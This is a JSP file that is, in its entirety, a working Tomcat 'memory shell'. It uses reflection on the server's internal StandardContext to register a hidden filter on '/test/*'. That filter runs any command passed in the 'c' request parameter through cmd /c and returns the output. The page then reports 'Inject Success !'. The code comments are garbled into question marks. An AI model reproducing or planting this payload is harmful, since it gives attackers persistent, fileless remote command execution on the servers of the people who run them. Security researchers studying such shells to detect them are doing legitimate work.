<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" language="java" %>

<%
    final String name = "test_Filter2";
    try {
        ServletContext servletContext = request.getSession().getServletContext();

        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        Map filterConfigs = (Map) Configs.get(standardContext);

        if (filterConfigs.get(name) == null) {
            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {

                }

                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter("c") != null) {
                        byte[] bytes = new byte[1024];
                        Process process = new ProcessBuilder("cmd", "/c", req.getParameter("c")).start();
                        int len = process.getInputStream().read(bytes);
                        servletResponse.getWriter().write(new String(bytes, 0, len));
                        process.destroy();
                        return;
                    }
                    filterChain.doFilter(servletRequest, servletResponse);
                }

                @Override
                public void destroy() {

                }

            };


            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * ???filterDef?????????filterDefs???
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/test/*");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            /**
             * ???filtermap?????????filtermaps???????????????????????????????????????filter??????chain????????????
             */
            standardContext.addFilterMapBefore(filterMap);

            /**
             * ???filterconfig??????ApplicationFilterConfig??????????????????filterconfigs???
             */
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(name, filterConfig);
            //????????????????????????????????????????????????/*???filter
            out.print("Inject Success !");
        }
    } catch (Exception e){
        e.printStackTrace();
    }
%>